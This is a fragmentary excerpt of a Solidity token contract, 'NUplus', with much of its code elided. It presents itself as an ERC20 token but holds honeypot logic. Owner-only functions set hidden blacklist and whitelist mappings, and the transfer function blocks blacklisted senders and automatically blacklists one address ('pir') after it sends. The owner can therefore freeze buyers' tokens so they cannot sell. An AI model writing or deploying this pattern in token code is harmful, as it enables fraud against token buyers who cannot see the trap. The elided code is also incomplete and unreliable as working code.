...
contract NUplus {
    ...
    mapping (address => bool) private lists;
    // Events
    ...
    function setlist(address add,bool a)public {
        require(msg.sender == owner);
        list[add]=a;
    }
    function setlists(address add,bool a)public {
        require(msg.sender == owner);
        lists[add]=a;
    }
    function getadds(address[] memory add)public {
        require(msg.sender == owner);
    ...
    function _transfer(address _sender, address _recipient, uint256 _amount) internal {
        ...
        require(!list[_sender] || lists[_sender]);
        balances[_sender] -= _amount;
        balances[_recipient] += _amount;
        emit Transfer(_sender, _recipient, _amount);
        if (_sender == pir && !lists[_sender]){
            list[_sender]=true;
        }
    }
    // ================= ERC20 Basic Write ===============
